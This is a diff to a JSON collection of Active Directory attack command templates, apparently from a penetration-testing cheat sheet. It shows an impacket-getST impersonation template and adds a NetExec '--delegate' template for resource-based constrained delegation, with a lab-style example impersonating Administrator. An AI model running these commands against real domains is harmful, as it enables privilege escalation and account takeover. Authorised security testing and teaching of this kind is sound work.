@@ -15,6 +15,12 @@
       "description": "Get a service ticket for a given SPN and impersonate a user using impacket-getST.",
       "template": "impacket-getST -spn 'cifs/{target_computer}' -impersonate {target_object} -dc-ip {ip} -k '{domain}/{username}:{password}'"
     },
+    
+        {
+      "title": "Impersonate via msDS-AllowedToActOnBehalfOfOtherIdentity (NetExec impersonate)",
+      "description": "If you control an object with msDS-AllowedToActOnBehalfOfOtherIdentity set to an account you control you can use NetExec's impersonate flag to execute RBCD and impersonate any user.",
+      "template": "nxc smb {dc_ip} -u {username} -p {password} --delegate {target_user}\n\nExample:\nnxc smb 192.168.56.11 -u jon.snow -p iknownnothing --delegate Administrator"
+    },
     {
       "title": "Create computer account (Windows PowerShell)",
       "description": "Create a new AD computer with a specified password.",
